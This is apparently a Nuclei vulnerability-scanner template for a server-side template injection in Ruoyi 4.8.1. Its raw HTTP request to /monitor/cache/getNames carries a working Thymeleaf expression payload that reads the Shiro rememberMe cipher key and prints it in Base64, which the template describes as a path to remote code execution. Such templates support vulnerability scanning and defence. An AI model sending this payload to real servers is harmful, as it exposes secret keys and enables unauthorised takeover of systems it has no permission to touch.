id: ruoyi4-8-1-ssti-shirokey-rce
info:
  name: Ruoyi 4.8.1 SSTI to Shiro Key to RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a Server-Side Template Injection (SSTI) vulnerability in Ruoyi version 4.8.1 that allows attackers to access the ShiroKey, potentially leading to Remote Code Execution (RCE).
  tags: ssti, rce, shirokey, ruoyi

http:
  - raw:
      - |
        POST /monitor/cache/getNames HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Sec-Fetch-Mode: cors
        sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
        X-Requested-With: XMLHttpRequest
        Sec-Fetch-Site: same-origin
        Accept-Language: zh-CN,zh;q=0.9
        X-CSRF-Token: JxbJuBkF+1WQAMT3u9i/sqsagEKm7GsXWD+mebzkmhs=
        Cookie: JSESSIONID=feec2fcc-209b-480c-b2bd-fedc510d91f7; 
        sec-ch-ua-platform: "Windows"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Sec-Fetch-Dest: empty
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/monitor/job
        Accept-Encoding: gzip, deflate, br, zstd
        sec-ch-ua-mobile: ?0
        Content-Length: 84

        fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x

    matchers:
      - type: status
        status:
          - 200